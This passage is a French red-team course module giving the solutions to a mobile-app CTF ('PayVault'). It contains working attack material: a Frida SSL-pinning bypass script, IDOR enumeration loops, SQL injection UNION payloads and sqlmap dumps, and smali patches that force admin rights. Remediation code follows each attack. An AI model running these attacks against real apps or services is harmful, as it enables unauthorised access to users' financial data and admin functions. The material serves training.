# Module 15 — Débrief CTF & Corrections : Opération "PayVault"

**Durée :** 0h45  
**Niveau :** M2 — Red Team  
**Prérequis :** Modules 1 à 14 (CTF terminé)

---

## Table des matières

1. [Correction Flag 1 — Credentials Hardcodés](#1-correction-flag-1--credentials-hardcodés)
2. [Correction Flag 2 — Bypass SSL Pinning](#2-correction-flag-2--bypass-ssl-pinning)
3. [Correction Flag 3 — IDOR via API Mobile](#3-correction-flag-3--idor-via-api-mobile)
4. [Correction Flag 4 — SQL Injection Backend](#4-correction-flag-4--sql-injection-backend)
5. [Correction Flag 5 — Patcher l'APK](#5-correction-flag-5--patcher-lapk)
6. [Tableau Synthèse ATT&CK du CTF](#6-tableau-synthèse-attck-du-ctf)
7. [Leçons Apprises et Bonnes Pratiques](#7-leçons-apprises-et-bonnes-pratiques)

---

## 1. Correction Flag 1 — Credentials Hardcodés

### 1.1 Solution étape par étape

**Objectif :** Extraire les credentials stockés en clair dans l'APK pour s'authentifier sur l'API backend.

**Technique MITRE :** T1552.001 (Unsecured Credentials: Credentials in Files)

```bash
# Étape 1 : Décompiler l'APK avec jadx-gui (interface graphique)
jadx-gui PayVault_v2.1.3.apk

# Étape 2 : Navigation dans jadx
# Sources → com → payvault → config → ApiConfig.java
```

**Contenu trouvé dans `ApiConfig.java` :**

```java
package com.payvault.config;

public class ApiConfig {
    // T1552.001 — CREDENTIALS HARDCODÉS EN PRODUCTION
    public static final String BASE_URL = "https://api.payvault.local:9090";
    public static final String API_KEY = "PAYVAULT_DEV_API_KEY_2024";
    public static final String DEV_USERNAME = "dev_user";
    public static final String DEV_PASSWORD = "P@ssw0rd2024!";
    public static final String API_VERSION = "v1";
}
```

```bash
# Étape 3 : Vérification alternative par extraction de chaînes
# Décompiler avec apktool puis grep sur les ressources
apktool d PayVault_v2.1.3.apk -o payvault_extracted 2>/dev/null
grep -r "P@ssw0rd\|dev_user\|api_key\|API_KEY" payvault_extracted/ --include="*.xml" --include="*.json"

# Méthode strings (si jadx non disponible)
strings PayVault_v2.1.3.apk | grep -E "password|username|api_key|P@ssw0rd|dev_user" | head -10
```

```bash
# Étape 4 : Validation — tester l'authentification avec les credentials trouvés
curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq .

# Réponse attendue :
# {
#   "status": "ok",
#   "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
#   "user": { "id": 1, "username": "dev_user", "role": "user" }
# }

# Étape 5 : Capture du header contenant le flag
curl -s -D - -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    2>&1 | grep -i "flag"
# X-CTF-Flag: FLAG{cr3d5_h4rdc0d3d_dans_apk_xxxx}
```

### 1.2 Pourquoi cette vulnérabilité existe

```
┌──────────────────────────────────────────────────────────────────┐
│          CAUSES RACINES — CREDENTIALS HARDCODÉS (T1552.001)       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. PRATIQUE DE DÉVELOPPEMENT DÉFAILLANTE                        │
│     Le développeur a laissé des credentials de test dans une     │
│     classe de configuration destinée au développement local.     │
│                                                                  │
│  2. ABSENCE DE REVUE DE CODE                                     │
│     Personne n'a vérifié le code avant la mise en production.    │
│     Un simple grep "password" dans le repo aurait suffi.         │
│                                                                  │
│  3. PAS DE SÉPARATION DES CONFIGURATIONS                         │
│     Les secrets ne sont pas extraits dans des fichiers           │
│     séparés par environnement (buildTypes, buildFlavors).        │
│                                                                  │
│  4. STOCKAGE EN CLAIR DANS L'APK                                 │
│     Même obfusqué, un APK est décompilable. Les chaînes en       │
│     clair sont immédiatement visibles avec strings ou jadx.      │
│                                                                  │
│  Impact : un attaquant téléchargeant l'APK (Play Store, APK      │
│  mirror) peut extraire les credentials et s'authentifier sur     │
│  l'API backend sans aucune autre information.                    │
│                                                                  │
│  NIS2 Art. 21.2(i) : politiques de sécurité pour le développement│
│  et la maintenance des SI — non respecté ici.                    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 1.3 Code de remédiation

```java
// REMÉDIATION — Gestion sécurisée des secrets Android

// Solution 1 : BuildConfig avec variables d'environnement
// build.gradle (app)
android {
    defaultConfig {
        buildConfigField "String", "API_KEY", 
            "\"${System.getenv('PAYVAULT_API_KEY') ?: 'dev_key'}\""
        // JAMAIS de credentials en dur
    }
}

// Solution 2 : Serveur de configuration distant
// Le client récupère les secrets APRES authentification
// Pas de secrets dans l'APK
public class RemoteConfig {
    public static String getApiKey(String authToken) {
        // GET /api/v1/auth/config  → le serveur renvoie une clé éphémère
    }
}

// Solution 3 : Android Keystore pour stockage chiffré local
import android.security.keystore.KeyGenParameterSpec;
import javax.crypto.KeyGenerator;
import java.security.KeyStore;

public void storeSecretSecurely(String alias, byte[] secret) {
    KeyGenerator keyGenerator = KeyGenerator.getInstance(
        KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore"
    );
    keyGenerator.init(new KeyGenParameterSpec.Builder(
        alias,
        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT
    ).setBlockModes(KeyProperties.BLOCK_MODE_GCM)
     .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
     .build());
    // Stocker via KeyStore chiffré
}
```

---

## 2. Correction Flag 2 — Bypass SSL Pinning

### 2.1 Solution avec Frida

**Objectif :** Contourner le SSL Pinning pour intercepter le trafic API et capturer le flag dans les headers de réponse.

**Technique MITRE :** T1643 (SSL/TLS Termination Bypass), T1040 (Network Sniffing)

```bash
# Étape 1 : Démarrer le serveur Frida sur l'émulateur/appareil
adb shell "su -c '/data/local/tmp/frida-server-16.x.x-android-x86_64 &'"
# Alternative pour appareil rooté : utiliser Magisk + frida-server module

# Étape 2 : Vérifier que Frida détecte l'application
frida-ps -Uai | grep payvault
# Résultat : 12345  PayVault  com.payvault.app
```

**Script de bypass SSL Pinning (`ssl_bypass.js`) :**

```javascript
// T1643 — SSL Pinning Bypass universel Android
setTimeout(function() {
    Java.perform(function() {
        console.log("[*] SSL Pinning Bypass — PayVault Operation");

        // Hook TrustManagerImpl (conscrypt Android)
        try {
            var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
            TrustManagerImpl.verifyChain.implementation = function(
                untrustedChain, trustAnchorChain, host, clientAuth,
                endpoint, handshakeSession, deviceConfig, sslSessionValidator) {
                console.log("[+] verifyChain bypassed pour: " + host);
                return untrustedChain;
            };
        } catch(e) { console.log("[*] TrustManagerImpl non trouvé"); }

        // Hook OkHttp3 CertificatePinner
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List')
                .implementation = function(hostname, peerCertificates) {
                console.log("[+] OkHttp3 CertificatePinner bypassed: " + hostname);
                return;
            };
        } catch(e) { console.log("[*] OkHttp3 non trouvé"); }

        // Hook TrustKit (DataTheorem)
        try {
            var TrustKit = Java.use('com.datatheorem.android.trustkit.pinning.TrustKit');
            TrustKit.getInstance.implementation = function() {
                console.log("[+] TrustKit bypassed");
                return null;
            };
        } catch(e) {}

        // Créer un TrustManager qui accepte TOUS les certificats
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustAllCerts = Java.registerClass({
            name: 'com.payvault.bypass.TrustAllCerts',
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });

        var sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, [TrustAllCerts.$new()], null);
        SSLContext.setDefault(sslContext);

        console.log("[+] SSL Pinning bypass COMPLET");
    });
}, 0);
```

```bash
# Étape 4 : Lancer Frida avec le script
frida -U -f com.payvault.app -l ssl_bypass.js --no-pause

# Étape 5 : Dans un autre terminal, configurer le proxy 
adb shell settings put global http_proxy 192.168.56.1:8080

# Dans Burp Suite : Proxy → Intercept → ON
# Les requêtes apparaissent maintenant en clair

# Étape 6 : Intercepter la réponse contenant le flag
# GET /api/v1/users/me HTTP/1.1
# Response Headers:
# X-CTF-Flag: FLAG{byp4ss_ssl_p1nn1ng_r3uss1_xxxx}
# ← Flag 2 dans les headers de réponse !
```

### 2.2 Alternative : Objection (automatisé)

```bash
# Installation et lancement
pip3 install objection
objection -g com.payvault.app explore

# Dans la console Objection :
# android sslpinning disable
# → Job done! Toutes les vérifications SSL sont désactivées
```

### 2.3 Pourquoi le SSL Pinning est contournable

```
┌──────────────────────────────────────────────────────────────────┐
│      POURQUOI LE SSL PINNING EST CONTOURNABLE (T1643)            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Le SSL Pinning repose sur une vérification CÔTÉ CLIENT.         │
│  Le client embarque l'empreinte (hash) du certificat serveur     │
│  et rejette toute connexion avec un certificat différent.        │
│                                                                  │
│  LIMITES FONDAMENTALES :                                         │
│                                                                  │
│  1. L'attaquant contrôle le client (appareil mobile).            │
│     → Il peut modifier l'application à sa guise.                │
│                                                                  │
│  2. Frida instrumente le processus au runtime (injection).       │
│     → Les vérifications en mémoire sont contournées.            │
│                                                                  │
│  3. Le code de vérification est dans l'APK (public).             │
│     → L'attaquant peut le patcher (apktool) ou le supprimer.    │
│                                                                  │
│  4. La confiance repose sur l'intégrité du client.               │
│     → Postulat faux en sécurité mobile.                          │
│                                                                  │
│  MORALITÉ : Le SSL Pinning est une COUCHE de défense,            │
│  pas une garantie. Il ralentit l'attaquant sans l'arrêter.      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 2.4 Remédiation : Certificate Transparency + pinning renforcé

```java
// 1. Network Security Configuration (Android 7+)
// res/xml/network_security_config.xml
// Avec expiration du pin (obligation de mise à jour)
// + Certificate Transparency enforcement

// 2. Google Play Integrity API
// Vérifie runtime que l'appareil et l'APK sont légitimes
// Si root/Frida détecté → les scores d'intégrité chutent

// 3. Détection Frida intégrée
public static boolean isFridaDetected() {
    // Scanner les ports Frida par défaut (27042, 27043)
    // Parcourir /proc/self/maps pour "frida" ou "gum-js-loop"
    // Vérifier les librairies injectées (frida-agent.so)
    try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/maps"))) {
        String line;
        while ((line = r.readLine()) != null) {
            if (line.contains("frida") || line.contains("gum-js-loop")
                || line.contains("frida-agent")) {
                return true;
            }
        }
    } catch (IOException e) {}
    return false;
}

// 4. Vérifier la signature de l'APK (anti-tampering)
public static boolean isApkTampered(Context ctx) {
    // Comparer la signature courante avec la signature officielle
    // Si différente → APK re-signé → tampering détecté
}
```

---

## 3. Correction Flag 3 — IDOR via API Mobile

### 3.1 Solution Burp Suite

**Objectif :** Exploiter l'absence de contrôle d'accès pour lire les données d'autres utilisateurs.

**Technique MITRE :** T1548 (Insecure Direct Object Reference)

```bash
# Étape 1 : Récupérer le token JWT du Flag 1
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq -r '.token')
echo "[+] Token : ${TOKEN:0:50}..."

# Étape 2 : Accéder à son PROPRE profil (ID=1)
curl -s http://localhost:9090/api/v1/users/1 \
    -H "Authorization: Bearer $TOKEN" | jq .
# {"id":1,"username":"dev_user","role":"user","balance":15000.00}

# Étape 3 : Tester l'IDOR — changer l'ID pour accéder à un autre utilisateur
curl -s http://localhost:9090/api/v1/users/2 \
    -H "Authorization: Bearer $TOKEN" | jq .
# {"id":2,"username":"jdoe","email":"john.doe@example.com",
#  "role":"user","balance":245000.00,
#  "secret_note":"Client VIP",
#  "flag_idor":"FLAG{1d0r_us3r_d4t4_l34k_xxxx}"}    ← FLAG 3 !
```

```bash
# Étape 4 : Script automatisé de scan IDOR
echo "[*] Scan IDOR sur IDs 1-100..."
for id in $(seq 1 100); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://localhost:9090/api/v1/users/$id" \
        -H "Authorization: Bearer $TOKEN")
    if [ "$code" == "200" ] && [ "$id" -ne 1 ]; then
        echo "[!] IDOR ID=$id accessible"
        curl -s "http://localhost:9090/api/v1/users/$id" \
            -H "Authorization: Bearer $TOKEN" | jq -r '.flag_idor // "pas de flag"'
    fi
done
```

### 3.2 Approche Burp Intruder

```
┌──────────────────────────────────────────────────────────────────┐
│          EXPLOITATION IDOR AUTOMATISÉE VIA BURP INTRUDER         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Intercepter GET /api/v1/users/1 → Envoyer à Intruder        │
│  2. Position payload : GET /api/v1/users/§1§ HTTP/1.1            │
│  3. Payload type : Numbers (1 à 100, step 1)                    │
│  4. Options → Grep Match : "FLAG{"                              │
│  5. Start Attack → Filtrer les hits contenant FLAG              │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 Remédiation : Contrôle d'accès côté serveur

```python
# REMÉDIATION — Backend Python/Flask

from functools import wraps
from flask import request, jsonify, g
import jwt

def require_auth(f):
    """Décorateur d'authentification JWT."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token:
            return jsonify({'error': 'Authentification requise'}), 401
        try:
            g.current_user = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Token invalide'}), 401
        return f(*args, **kwargs)
    return decorated

def require_ownership(user_id_param='user_id'):
    """Vérifie que l'utilisateur accède UNIQUEMENT à ses propres données."""
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            requested_id = kwargs.get(user_id_param)
            current_id = g.current_user.get('user_id')
            if requested_id != current_id:
                logging.warning(f"IDOR attempt: user {current_id} → user {requested_id}")
                return jsonify({'error': 'Accès non autorisé'}), 403
            return f(*args, **kwargs)
        return decorated
    return require_auth

# ENDPOINT CORRIGÉ
@app.route('/api/v1/users/<int:user_id>')
@require_auth
@require_ownership('user_id')  # ← L'utilisateur ne peut voir QUE son profil
def get_user(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_safe_dict())
```

---

## 4. Correction Flag 4 — SQL Injection Backend

### 4.1 Solution sqlmap (automatisée)

**Objectif :** Exploiter l'injection SQL sur l'endpoint `/api/v1/search` pour extraire le flag.

**Technique MITRE :** T1190 (Exploit Public-Facing Application)

```bash
# Étape 1 : Se reconnecter
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq -r '.token')

# Étape 2 : Test manuel de détection (apostrophe)
curl -s "http://localhost:9090/api/v1/search?q=test'" \
    -H "Authorization: Bearer $TOKEN"
# Réponse : {"error": "SQL error: syntax error..."} → SQLi CONFIRMÉE

# Étape 3 : Créer le fichier de requête sqlmap
cat > sqli_request.txt << EOF
GET /api/v1/search?q=test HTTP/1.1
Host: localhost:9090
Authorization: Bearer $TOKEN
Accept: application/json
Connection: close

EOF

# Étape 4 : Lancer sqlmap
sqlmap -r sqli_request.txt -p q --dbms=PostgreSQL --batch --level=3 --risk=2

# Résultat : le paramètre q est vulnérable (UNION query)

# Étape 5 : Énumérer les bases
sqlmap -r sqli_request.txt -p q --dbms=PostgreSQL --dbs --batch
# [*] payvault, information_schema, pg_catalog

# Étape 6 : Tables de la base payvault
sqlmap -r sqli_request.txt -p q --dbms=PostgreSQL -D payvault --tables --batch
# Tables: accounts, admin_logs, flags, transactions, users

# Étape 7 : Dump de la table flags
sqlmap -r sqli_request.txt -p q --dbms=PostgreSQL \
    -D payvault -T flags --dump --batch

# Résultat :
# +----------------+------------------------------------------+
# | flag_name      | flag_value                               |
# +----------------+------------------------------------------+
# | flag_hardcoded | FLAG{cr3d5_h4rdc0d3d_dans_apk_xxxx}    |
# | flag_ssl       | FLAG{byp4ss_ssl_p1nn1ng_r3uss1_xxxx}    |
# | flag_idor      | FLAG{1d0r_us3r_d4t4_l34k_xxxx}          |
# | flag_sqli      | FLAG{sql1_back3nd_c0mpr0m1s_xxxx}       |  ← FLAG 4 !
# | flag_admin     | FLAG{p4tch3d_4pk_4dm1n_4cc3ss_xxxx}    |
# +----------------+------------------------------------------+
```

### 4.2 Solution manuelle (approche pédagogique)

```bash
TOKEN="eyJhbGci..."  # Token du Flag 1

# Étape 1 : Déterminer le nombre de colonnes
curl -s "http://localhost:9090/api/v1/search?q=x'+ORDER+BY+3--" \
    -H "Authorization: Bearer $TOKEN"    # → OK (3 colonnes)
curl -s "http://localhost:9090/api/v1/search?q=x'+ORDER+BY+4--" \
    -H "Authorization: Bearer $TOKEN"    # → Erreur → 3 colonnes confirmées

# Étape 2 : Identifier les types de colonnes
curl -s "http://localhost:9090/api/v1/search?q=x'+UNION+SELECT+'a','b',1--" \
    -H "Authorization: Bearer $TOKEN" | jq .
# Col 1 = varchar, Col 2 = varchar, Col 3 = integer

# Étape 3 : Version du SGBD
curl -s "http://localhost:9090/api/v1/search?q=x'+UNION+SELECT+version(),NULL,NULL--" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.results[0].name'
# PostgreSQL 15.4

# Étape 4 : Énumérer les tables
curl -s -G "http://localhost:9090/api/v1/search" \
    --data-urlencode "q=x' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema='public'--" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.results[].name'
# accounts, admin_logs, flags, transactions, users

# Étape 5 : Colonnes de la table flags
curl -s -G "http://localhost:9090/api/v1/search" \
    --data-urlencode "q=x' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='flags'--" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.results[].name'

# Étape 6 : Extraire les flags
curl -s -G "http://localhost:9090/api/v1/search" \
    --data-urlencode "q=x' UNION SELECT flag_name,flag_value,challenge FROM flags--" \
    -H "Authorization: Bearer $TOKEN" | jq '.results[]'
```

### 4.3 Anatomie de la requête SQL injectée

```sql
-- REQUÊTE ORIGINALE (vulnérable)
SELECT name, description, id
FROM search_index
WHERE name ILIKE '%' || ? || '%'
-- Le paramètre ? = valeur de "q", directement concaténée

-- Avec q = "test" :
SELECT name, description, id FROM search_index WHERE name ILIKE '%test%'

-- Avec injection (q = "x' UNION SELECT flag_name, flag_value, challenge FROM flags--") :
SELECT name, description, id FROM search_index WHERE name ILIKE '%x'
UNION SELECT flag_name, flag_value, challenge FROM flags--%'
--       ↑ L'injection commence ici. Le "--" commente le reste (%')
```

### 4.4 Remédiation : Requêtes paramétrées

```python
# REMÉDIATION — SEULE correction valable = requêtes paramétrées

# === CODE VULNÉRABLE (NE JAMAIS FAIRE) ===
# sql = f"SELECT * FROM search_index WHERE name ILIKE '%{query}%'"
# db.engine.execute(sql)  # ← CONCATÉNATION = SQLi

# === SOLUTION 1 : SQLAlchemy ORM (recommandée) ===
@app.route('/api/v1/search')
def search():
    query_param = request.args.get('q', '')
    results = SearchIndex.query.filter(
        SearchIndex.name.ilike(f'%{query_param}%')  # ORM échappe automatiquement
    ).all()
    return jsonify({
        'results': [r.to_dict() for r in results],
        'count': len(results)
    })

# === SOLUTION 2 : Prepared Statement explicite ===
from sqlalchemy import text
@app.route('/api/v1/search')
def search_raw():
    query_param = request.args.get('q', '')
    sql = text("SELECT name, description, id FROM search_index WHERE name ILIKE :q")
    result = db.engine.execute(sql, {'q': f'%{query_param}%'})
    # Le paramètre :q est BINDÉ — jamais interprété comme du SQL
    return jsonify({'results': [dict(r) for r in result]})

# === SOLUTION 3 : PostgreSQL avec psycopg2 ===
# cursor.execute(
#     "SELECT * FROM search_index WHERE name ILIKE %s",
#     (f'%{query}%',)  # %s = placeholder → valeur échappée
# )
```

---

## 5. Correction Flag 5 — Patcher l'APK

### 5.1 Solution complète

**Objectif :** Modifier l'APK pour que la méthode `isAdmin()` retourne toujours `true`.

**Technique MITRE :** T1574.010 (App Modification), T1406.002 (Smali Patching)

```bash
echo "═══════════════════════════════════════════════"
echo "  FLAG 5 — PATCH APK PAYVAULT"
echo "═══════════════════════════════════════════════"

# ====== ÉTAPE 1 : Décompiler l'APK ======
echo "[1/6] Décompilation..."
apktool d PayVault_v2.1.3.apk -o payvault_patch -f
echo "[+] payvault_patch/ créé"

# ====== ÉTAPE 2 : Trouver le fichier à patcher ======
echo "[2/6] Recherche de SessionManager..."
find payvault_patch -name "SessionManager*"
# payvault_patch/smali/com/payvault/auth/SessionManager.smali

# ====== ÉTAPE 3 : Lire la méthode isAdmin() originale ======
echo "[3/6] Analyse du smali..."
grep -A 20 "\.method public isAdmin" \
    payvault_patch/smali/com/payvault/auth/SessionManager.smali
```

**Code smali original de `isAdmin()` :**

```smali
.method public isAdmin()Z
    .locals 3

    iget-object v0, p0, Lcom/payvault/auth/SessionManager;->context:Landroid/content/Context;
    const-string v1, "payvault_prefs"
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2}, ...
    move-result-object v0
    const-string v1, "user_role"
    const-string v2, "user"
    invoke-interface {v0, v1, v2}, ...
    move-result-object v1
    const-string v0, "admin"
    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    return v0
.end method
```

```bash
# ====== ÉTAPE 4 : Patcher — Remplacer isAdmin() ======
echo "[4/6] Patch smali..."

python3 << 'PYTHON_PATCH'
import re

filepath = "payvault_patch/smali/com/payvault/auth/SessionManager.smali"
with open(filepath, 'r') as f:
    content = f.read()

# Trouver toute la méthode isAdmin()
pattern = r'(\.method public isAdmin\(\)Z.*?\.end method)'
match = re.search(pattern, content, re.DOTALL)

if match:
    new_method = """.method public isAdmin()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method"""
    
    content = content.replace(match.group(1), new_method)
    with open(filepath, 'w') as f:
        f.write(content)
    print("[+] isAdmin() patché → retourne TOUJOURS true")
else:
    print("[-] Méthode isAdmin() non trouvée")
PYTHON_PATCH

# Patch bonus : getRole() retourne toujours "admin"
python3 << 'PYTHON_GETROLE'
import re
filepath = "payvault_patch/smali/com/payvault/auth/SessionManager.smali"
with open(filepath, 'r') as f:
    content = f.read()
pattern = r'(\.method public getRole\(\).*?\.end method)'
match = re.search(pattern, content, re.DOTALL)
if match:
    new_method = """.method public getRole()Ljava/lang/String;
    .locals 1
    const-string v0, "admin"
    return-object v0
.end method"""
    content = content.replace(match.group(1), new_method)
    with open(filepath, 'w') as f:
        f.write(content)
    print("[+] getRole() patché → retourne toujours 'admin'")
PYTHON_GETROLE

# ====== ÉTAPE 5 : Recompiler et signer ======
echo "[5/6] Recompilation + signature..."

apktool b payvault_patch -o PayVault_patched_unsigned.apk

# Signer
keytool -genkey -v -keystore debug.keystore -alias debug \
    -keyalg RSA -keysize 2048 -validity 36500 \
    -storepass android -keypass android \
    -dname "CN=Debug, OU=RedTeam, O=SDV, L=Paris, C=FR" 2>/dev/null

zipalign -v -p 4 PayVault_patched_unsigned.apk PayVault_aligned.apk 2>/dev/null

apksigner sign --ks debug.keystore --ks-key-alias debug \
    --ks-pass pass:android --key-pass pass:android \
    --out PayVault_patched_signed.apk PayVault_aligned.apk

echo "[+] APK signé : PayVault_patched_signed.apk"

# ====== ÉTAPE 6 : Installer et tester ======
echo "[6/6] Installation..."
adb uninstall com.payvault.app 2>/dev/null
adb install PayVault_patched_signed.apk

echo ""
echo "[+] APK patché installé ! Fonctionnalités admin débloquées."
```

```bash
# Récupération du Flag 5 via l'API après patch
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq -r '.token')

# Le module admin est maintenant accessible
curl -s http://localhost:9090/api/v1/admin/stats \
    -H "Authorization: Bearer $TOKEN" | jq .
# {"stats":{...}, "flag":"FLAG{p4tch3d_4pk_4dm1n_4cc3ss_xxxx}"}
```

### 5.2 Remédiation : Vérification serveur-side + anti-tampering

```
┌──────────────────────────────────────────────────────────────────┐
│          PYRAMIDE DE CONFIANCE — DÉFENSE EN PROFONDEUR            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  5. ╔══════════════════════════════╗  ← VÉRIFICATION FINALE      │
│     ║  SERVEUR-SIDE AUTHORIZATION  ║     (NE JAMAIS FAIRE         │
│     ║  Le rôle admin est vérifié   ║      CONFIANCE AU CLIENT)   │
│     ║  dans la base de données     ║                              │
│     ╚══════════════════════════════╝                              │
│                      ▲                                           │
│  4. ╔══════════════════════════════╗                              │
│     ║  JWT SIGNÉ (HMAC-RSA)       ║  ← Token vérifié             │
│     ║  Clé secrète côté serveur   ║     cryptographiquement      │
│     ╚══════════════════════════════╝                              │
│                      ▲                                           │
│  3. ╔══════════════════════════════╗                              │
│     ║  GOOGLE PLAY INTEGRITY API  ║  ← Vérification runtime      │
│     ║  APK légitime ? Root ?      ║     (Google)                 │
│     ╚══════════════════════════════╝                              │
│                      ▲                                           │
│  2. ╔══════════════════════════════╗                              │
│     ║  ANTI-TAMPERING LOCAL       ║  ← Signature check           │
│     ║  Détection Frida + Root     ║     (ralentit l'attaquant)   │
│     ╚══════════════════════════════╝                              │
│                      ▲                                           │
│  1. ╔══════════════════════════════╗                              │
│     ║  OBFUSCATION (R8/ProGuard)  ║  ← Rend le RE plus dur      │
│     ║  Code + Strings             ║     (pas infranchissable)    │
│     ╚══════════════════════════════╝                              │
│                                                                  │
│  AUCUNE couche n'est inviolable seule. La combinaison            │
│  ralentit l'attaquant et augmente le coût de l'attaque.          │
│  La couche 5 (serveur-side) est la SEULE obligatoire.            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 6. Tableau Synthèse ATT&CK du CTF

### 6.1 Mapping complet

| Flag | Technique MITRE | ID | Phase | Outils | Niveau |
|------|----------------|-----|-------|--------|--------|
| 1 | Credentials in Files | T1552.001 | Credential Access | jadx-gui, strings, apktool | ★☆☆☆☆ |
| 2 | SSL/TLS Termination Bypass | T1643 | Defense Evasion | Frida, Objection, Burp | ★★☆☆☆ |
| 2 | Network Traffic Interception | T1040 | Collection | Burp Suite Proxy | ★★☆☆☆ |
| 2 | Subvert Trust Controls | T1553.004 | Defense Evasion | Burp CA Certificate | ★★☆☆☆ |
| 3 | Insecure Direct Object Reference | T1548 | Collection | Burp Intruder, curl | ★★★☆☆ |
| 4 | Exploit Public-Facing App (SQLi) | T1190 | Initial Access | sqlmap, curl | ★★★★☆ |
| 4 | Data from Information Repositories | T1213 | Collection | SQL UNION queries | ★★★★☆ |
| 5 | App Modification (Smali) | T1574.010 | Defense Evasion | apktool, smali, zipalign | ★★★★★ |
| 5 | Decompile/Recompile App | T1406.002 | Defense Evasion | apktool b, apksigner | ★★★★★ |
| — | Reverse Engineering | T1406 | Discovery | jadx-gui, apktool d | ★★☆☆☆ |

### 6.2 Heatmap des phases ATT&CK

```
┌──────────────────────────────────────────────────────────────────┐
│                 HEATMAP ATT&CK — OPÉRATION PAYVAULT               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  RECONNAISSANCE      ░░░░░  (APK fournie directement)            │
│  RESOURCE DEV.       ██░░░  (Frida, Burp, sqlmap)               │
│  INITIAL ACCESS      █████  (T1190 — SQLi)                      │
│  EXECUTION           ██░░░  (curl, sqlmap, api calls)           │
│  PERSISTENCE         ░░░░░  (non couvert — voir Module 13)       │
│  PRIVILEGE ESCALATION ███░░  (T1548 — IDOR, T1574 — Patch)      │
│  DEFENSE EVASION     █████  (T1643, T1574, T1406, T1553)        │
│  CREDENTIAL ACCESS   ████░  (T1552.001)                          │
│  COLLECTION          █████  (T1040, T1213, T1548)               │
│  EXFILTRATION        ██░░░  (Flags + données utilisateurs)      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 6.3 Parcours d'attaque complet visualisé

```
┌──────────────────────────────────────────────────────────────────┐
│          DIAGRAMME DE FLUX D'ATTAQUE — PAYVAULT CTF               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  [APK fournie]                                                   │
│       │                                                          │
│       ├─► Flag 1: jadx → ApiConfig.java → dev_user:P@ssw0rd2024!│
│       │          → Authentification API → Token JWT              │
│       │                                                          │
│       ├─► Flag 2: Frida bypass SSL Pinning → Burp Proxy         │
│       │          → Interception trafic API → Flag header         │
│       │                                                          │
│       ├─► Flag 3: Token JWT + /api/v1/users/{id} → IDOR         │
│       │          → Accès données jdoe → Flag IDOR                │
│       │                                                          │
│       ├─► Flag 4: Découverte /api/v1/search via jadx            │
│       │          → q=x'+UNION+SELECT → SQLi → dump flags table  │
│       │          → FLAG{sql1_back3nd_c0mpr0m1s}                  │
│       │                                                          │
│       └─► Flag 5: apktool d → SessionManager.smali              │
│                  → isAdmin() patch → true → rebuild              │
│                  → sign → install → admin access → Flag 5        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 7. Leçons Apprises et Bonnes Pratiques

### 7.1 Classification des vulnérabilités

```
┌──────────────────────────────────────────────────────────────────┐
│            CLASSIFICATION DES VULNÉRABILITÉS PAYVAULT             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  MAUVAISE GESTION DES SECRETS                                    │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ • Flag 1 : Credentials en dur dans l'APK (T1552.001)       │ │
│  │ • Flag 5 : Clé JWT stockée dans le code (T1606.001)        │ │
│  │                                                            │ │
│  │ → Cause racine : confiance indue dans le client mobile      │ │
│  │ → Règle d'or : RIEN de sensible dans l'APK                 │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  CONTRÔLE D'ACCÈS DÉFAILLANT                                     │
